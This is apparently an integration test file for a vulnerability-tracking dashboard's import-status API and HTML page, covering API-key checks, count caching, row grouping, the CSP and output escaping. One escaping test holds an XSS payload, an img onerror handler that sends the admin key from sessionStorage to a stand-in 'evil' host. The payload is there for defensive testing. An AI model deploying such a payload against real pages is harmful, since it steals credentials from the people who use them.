import { describe, it, expect, afterAll, afterEach, beforeAll, beforeEach, vi } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { createServer } from '../server.js';
import { prisma } from '../../db/client.js';
import { resetDb } from '../../test-utils/db.js';
import { importNVDData } from '../../worker/nvd-fetcher.js';
import { ECOSYSTEM_COUNTS_CACHE_TTL_MS, resetOsvCountsCache } from './dashboard.js';

const API_KEY = 'test-api-key'; // matches vitest.integration.config.ts
const ADMIN_API_KEY = 'test-admin-key'; // likewise

describe('dashboard', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await createServer();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('GET /api/v1/import-status', () => {
    const get = (headers: Record<string, string> = {}) =>
      app.inject({ method: 'GET', url: '/api/v1/import-status', headers });

    it('rejects a request with no API key', async () => {
      expect((await get()).statusCode).toBe(401);
    });

    it('rejects a wrong API key', async () => {
      expect((await get({ 'x-api-key': 'wrong' })).statusCode).toBe(401);
    });

    it('rejects a duplicated header, which arrives as an array rather than a string', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/import-status',
        headers: { 'x-api-key': [ADMIN_API_KEY, 'wrong'] as unknown as string },
      });
      expect(res.statusCode).toBe(401);
    });

    it('accepts the admin key', async () => {
      expect((await get({ 'x-api-key': ADMIN_API_KEY })).statusCode).toBe(200);
    });

    it('rejects the shared API key, which every client holds', async () => {
      expect((await get({ 'x-api-key': API_KEY })).statusCode).toBe(401);
    });

    describe('per-ecosystem count caching', () => {
      // The underlying query is a full scan with no selective WHERE clause
      // (COUNT(DISTINCT "vulnerabilityId") GROUP BY ecosystem over the whole
      // table) -- measured at 13.7s against production-scale data even after
      // ANALYZE, 5.7s with a covering index. Re-running it on every 60s
      // dashboard poll bought nothing, since the underlying data only changes
      // once a day, so it's cached for a few minutes. These tests exist to
      // catch a regression to "always fresh" (defeats the point) or "never
      // refreshes" (a stale dashboard forever) without waiting out the real
      // 5-minute TTL.
      const ecosystem = `test-cache-ecosystem-${Date.now()}`;

      async function seedOneVulnerability(suffix: string) {
        const master = await prisma.vulnerability.create({ data: {} });
        const osv = await prisma.oSVVulnerability.create({
          data: { osvId: `GHSA-cache-test-${suffix}`, rawData: {}, masterVulnId: master.id },
        });
        await prisma.oSVAffectedPackage.create({
          data: { vulnerabilityId: osv.id, ecosystem, packageName: 'test-package' },
        });
      }

      const countFor = (body: { osvEcosystems: Array<{ ecosystem: string; recordCount: number }> }) =>
        body.osvEcosystems.find(e => e.ecosystem === ecosystem)?.recordCount ?? 0;

      afterEach(async () => {
        vi.useRealTimers();
        await prisma.oSVAffectedPackage.deleteMany({ where: { ecosystem } });
        await prisma.oSVVulnerability.deleteMany({ where: { osvId: { startsWith: 'GHSA-cache-test-' } } });
      });

      // The cache is a module-level singleton, so an earlier test in this
      // file may have already warmed it against real time. Faking Date and
      // jumping forward from "now" by more than the TTL guarantees the next
      // call is a genuine miss regardless of what any prior test left behind.
      function forceCacheMiss() {
        vi.useFakeTimers({ toFake: ['Date'] });
        vi.setSystemTime(Date.now() + ECOSYSTEM_COUNTS_CACHE_TTL_MS + 1);
      }

      it('does not reflect a DB change made within the cache TTL', async () => {
        forceCacheMiss();
        await seedOneVulnerability('a');
        const first = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
        expect(countFor(first)).toBe(1);

        await seedOneVulnerability('b');
        const second = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
        expect(countFor(second)).toBe(1); // still cached, not 2
      });

      it('refreshes once the cache TTL has elapsed', async () => {
        forceCacheMiss();
        await seedOneVulnerability('c');
        const before = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
        expect(countFor(before)).toBe(1);

        await seedOneVulnerability('d');
        vi.setSystemTime(Date.now() + ECOSYSTEM_COUNTS_CACHE_TTL_MS + 1);

        const after = (await get({ 'x-api-key': ADMIN_API_KEY })).json();
        expect(countFor(after)).toBe(2);
      });
    });

    describe('OSV rows of a distro that shares one bucket', () => {
      // OSV serves every Debian release from one bucket, so one job ("osv-Debian") imports them
      // all, and the dashboard has one row for it. A row that looked up "osv-Debian:13" would show
      // the status of a job that no longer runs (and its old enabled flag), hiding the real one.
      const ecosystem = 'Debian:13';

      afterEach(async () => {
        vi.useRealTimers();
        await prisma.oSVAffectedPackage.deleteMany({ where: { ecosystem } });
        await prisma.oSVVulnerability.deleteMany({ where: { osvId: 'DEBIAN-CVE-shared-bucket-test' } });
        await prisma.collectionJob.deleteMany({ where: { source: { in: ['osv-Debian', 'osv-Debian:13'] } } });
        await prisma.jobConfig.deleteMany({ where: { source: { in: ['osv-Debian', 'osv-Debian:13'] } } });
      });

      it('takes the status and the on/off flag of the shared job', async () => {
        vi.useFakeTimers({ toFake: ['Date'] });
        // The count cache is shared with the tests above, which leave it warm for a few TTLs.
        vi.setSystemTime(Date.now() + 10 * ECOSYSTEM_COUNTS_CACHE_TTL_MS);
        const master = await prisma.vulnerability.create({ data: {} });
        const osv = await prisma.oSVVulnerability.create({ data: { osvId: 'DEBIAN-CVE-shared-bucket-test', rawData: {}, masterVulnId: master.id } });
        await prisma.oSVAffectedPackage.create({ data: { vulnerabilityId: osv.id, ecosystem, packageName: 'util-linux' } });
        await prisma.collectionJob.create({ data: { source: 'osv-Debian', status: 'failed', startedAt: new Date(), completedAt: new Date(), errorMessage: 'frozen bucket' } });
        await prisma.collectionJob.create({ data: { source: 'osv-Debian:13', status: 'completed', startedAt: new Date(0), completedAt: new Date(0) } });
        await prisma.jobConfig.create({ data: { source: 'osv-Debian', enabled: true } });

        const row = (await get({ 'x-api-key': ADMIN_API_KEY })).json().osvEcosystems.find((e: { ecosystem: string }) => e.ecosystem === 'Debian');

        expect(row).toMatchObject({ source: 'osv-Debian', enabled: true, status: 'failed', errorMessage: 'frozen bucket' });
      });
    });

    describe('one OSV row per job', () => {
      // The releases of a distro are one job, with one On/Off, Run and Reload: one row, with the
      // releases and their own counts inside it, and the job's own distinct count as its Records.
      const prefix = 'one-row-test';
      type Row = { ecosystem: string; source: string; recordCount: number; maintained: boolean; releases: { ecosystem: string; recordCount: number; maintained: boolean }[] };

      async function vuln(name: string, ecosystems: string[]) {
        const master = await prisma.vulnerability.create({ data: {} });
        const osv = await prisma.oSVVulnerability.create({ data: { osvId: `${prefix}-${name}`, rawData: {}, masterVulnId: master.id } });
        for (const ecosystem of ecosystems) {
          await prisma.oSVAffectedPackage.create({ data: { vulnerabilityId: osv.id, ecosystem, packageName: `pkg-${name}` } });
        }
      }
      const rows = async (): Promise<Row[]> => {
        resetOsvCountsCache();
        return (await get({ 'x-api-key': ADMIN_API_KEY })).json().osvEcosystems;
      };

      // Other tests, and other files on this database, leave OSV rows behind; these count exact numbers.
      beforeEach(async () => {
        await resetDb();
      });

      afterEach(async () => {
        resetOsvCountsCache();
        await prisma.oSVAffectedPackage.deleteMany({ where: { vulnerability: { osvId: { startsWith: prefix } } } });
        await prisma.oSVVulnerability.deleteMany({ where: { osvId: { startsWith: prefix } } });
      });

      it('lists the releases of a distro as one row, counting each vulnerability once', async () => {
        await vuln('a', ['Ubuntu:22.04:LTS', 'Ubuntu:24.04:LTS']);
        await vuln('b', ['Ubuntu:22.04:LTS']);
        await vuln('c', ['Debian:12']);

        const all = await rows();

        expect(all.filter((r) => r.ecosystem.startsWith('Ubuntu'))).toEqual([
          expect.objectContaining({
            ecosystem: 'Ubuntu', source: 'osv-Ubuntu', recordCount: 2, maintained: true,
            releases: [
              { ecosystem: 'Ubuntu:22.04:LTS', recordCount: 2, maintained: true },
              { ecosystem: 'Ubuntu:24.04:LTS', recordCount: 1, maintained: true },
            ],
          }),
        ]);
        // A distro with one release in the data has nothing to tell apart inside its row.
        expect(all.find((r) => r.ecosystem === 'Debian')).toMatchObject({ source: 'osv-Debian', recordCount: 1, releases: [] });
        expect(all.some((r) => r.ecosystem === 'Ubuntu:22.04:LTS' || r.ecosystem === 'Debian:12')).toBe(false);
      });

      it('is maintained when any release is, and says which releases are outside the policy', async () => {
        await vuln('d', ['Debian:12']);
        await vuln('e', ['Debian:3.0']);
        await vuln('f', ['Alpine:v3.2']);

        const all = await rows();

        const debian = all.find((r) => r.ecosystem === 'Debian')!;
        expect(debian.maintained).toBe(true);
        expect(debian.releases.map((r) => [r.ecosystem, r.maintained])).toEqual([['Debian:12', true], ['Debian:3.0', false]]);
        // Only a release outside the policy: the job goes under "Outside support policy".
        expect(all.find((r) => r.ecosystem === 'Alpine')).toMatchObject({ maintained: false });
      });

      it('puts an ecosystem in the bucket the importer uses (osvBucketName), and leaves the others as they are', async () => {
        await vuln('g', ['AlmaLinux:9', 'Rocky Linux:9', 'Root:Debian:13', 'Red Hat:9', 'npm', 'Debian']);

        const all = await rows();
        const names = new Set(all.map((r) => r.ecosystem));

        for (const name of ['AlmaLinux', 'Rocky Linux', 'Root', 'Red Hat', 'npm', 'Debian']) expect(names.has(name), name).toBe(true);
        for (const name of ['AlmaLinux:9', 'Rocky Linux:9', 'Root:Debian:13', 'Red Hat:9']) expect(names.has(name), name).toBe(false);
        expect(all.find((r) => r.ecosystem === 'Root')?.source).toBe('osv-Root');
      });
    });
  });

  describe('GET /dashboard', () => {
    it('serves the HTML shell without an API key', async () => {
      const res = await app.inject({ method: 'GET', url: '/dashboard' });
      expect(res.statusCode).toBe(200);
      expect(res.headers['content-type']).toContain('text/html');
    });

    it('declares the favicon, and serves it without an API key', async () => {
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      expect(html).toContain('<link rel="icon" type="image/png" href="/icon.png" />');

      const icon = await app.inject({ method: 'GET', url: '/icon.png' });
      expect(icon.statusCode).toBe(200);
      expect(icon.headers['content-type']).toBe('image/png');
    });

    it('escapes values that reach innerHTML', async () => {
      // The dashboard renders values it does not control: OSV ecosystem names
      // come from upstream data, and errorMessage is whatever a failing fetcher
      // produced. Both are interpolated into innerHTML, and the admin key lives
      // in sessionStorage, so an injected script would be able to read it.
      // esc() is taken from the script the page loads, so this exercises the
      // shipped implementation rather than a copy of it.
      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
      const escSource = js.match(/function esc\(v\) \{[\s\S]*?\n\}/)?.[0];
      expect(escSource, 'esc() must exist in the served script').toBeDefined();

      const esc = new Function(`${escSource}; return esc;`)() as (v: unknown) => string;
      const payload = `<img src=x onerror="fetch('//evil/'+sessionStorage.getItem('heretix_admin_api_key'))">`;
      const escaped = esc(payload);

      expect(escaped).not.toMatch(/[<>]/);
      expect(escaped).not.toMatch(/["']/);
      expect(esc(null)).toBe('');
    });

    it('does not build click handlers by interpolating data into onclick attributes', async () => {
      // Job sources are interpolated into the action buttons; inside an
      // onclick they would sit in an HTML-attribute *and* a JS-string context
      // at once. Data attributes plus delegation leave only the former.
      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
      expect(js).not.toMatch(/onclick="(runJob|toggleJob)/);
      expect(js).toContain('data-action="run"');
      expect(js).toContain('data-action="toggle"');
    });

    it('loads its script and styles from this server only, under a CSP that refuses inline script', async () => {
      // A script from a CDN could read the admin key; so could one injected
      // into the markup, which the CSP keeps from running.
      const res = await app.inject({ method: 'GET', url: '/dashboard' });
      expect(res.body).not.toMatch(/<script>|<style>|onclick=|https?:\/\//);
      expect(res.body).toContain('<script src="/dashboard.js"></script>');
      const csp = res.headers['content-security-policy'] as string;
      expect(csp).toContain("default-src 'none'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).not.toContain('unsafe-inline');

      for (const [url, type] of [['/dashboard.js', 'text/javascript'], ['/dashboard.css', 'text/css']]) {
        const file = await app.inject({ method: 'GET', url });
        expect(file.statusCode).toBe(200);
        expect(file.headers['content-type']).toContain(type);
      }
    });

    it('opens on a sign-in screen, with the dashboard hidden until the server accepts the key', async () => {
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      expect(html).toContain('id="sign-in-form"');
      expect(html).toContain('id="dashboard" class="page hidden"');
      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
      // 401 on any request goes back to the sign-in screen and forgets the key.
      expect(js).toMatch(/status === 401\) \{\s*signOut\(/);
    });

    it('keeps the admin key for the tab only', async () => {
      const js = (await app.inject({ method: 'GET', url: '/dashboard.js' })).body;
      expect(js).toContain('sessionStorage');
      expect(js).not.toContain('localStorage');
    });
  });

  describe('GET /api/v1/import-status: first load', () => {
    const status = async () =>
      (await app.inject({ method: 'GET', url: '/api/v1/import-status', headers: { 'x-api-key': ADMIN_API_KEY } })).json();

    it('says which sources a Run would load in full', async () => {
      await resetDb();
      const { coreSources } = await status();
      const bySource = Object.fromEntries(coreSources.map((s: { source: string; needsFirstLoad: boolean }) => [s.source, s.needsFirstLoad]));
      expect(bySource).toMatchObject({ nvd: true, kev: false, epss: false });
    });

    it('offers a reload only for a source that has a full load and is loaded already', async () => {
      await resetDb();
      await importNVDData({ id: 'CVE-2026-0001', published: '2026-01-01T00:00:00.000', lastModified: '2026-01-02T00:00:00.000', descriptions: [{ lang: 'en', value: 'x' }], configurations: [] } as never);
      await prisma.collectionJob.create({ data: { source: 'nvd', status: 'completed', startedAt: new Date(), completedAt: new Date() } });

      const { coreSources } = await status();
      const canReload = Object.fromEntries(coreSources.map((s: { source: string; canReload: boolean }) => [s.source, s.canReload]));

      // NVD is loaded and has a full load; CVE Records have a full load but are not loaded; KEV has no full load.
      expect(canReload).toMatchObject({ nvd: true, cna: false, kev: false });
    });

    it('shows an OSV ecosystem that is being loaded for the first time, before any record is here', async () => {
      await resetDb();
      await prisma.collectionJob.create({ data: { source: 'osv-npm', status: 'running', startedAt: new Date(), metadata: { mode: 'full' } } });

      const { osvEcosystems } = await status();

      // (Ecosystems with records come from a cache shared with the tests above, so look for this one.)
      expect(osvEcosystems).toContainEqual(expect.objectContaining({ ecosystem: 'npm', source: 'osv-npm', status: 'running', recordCount: 0, needsFirstLoad: true }));
    });
  });
});
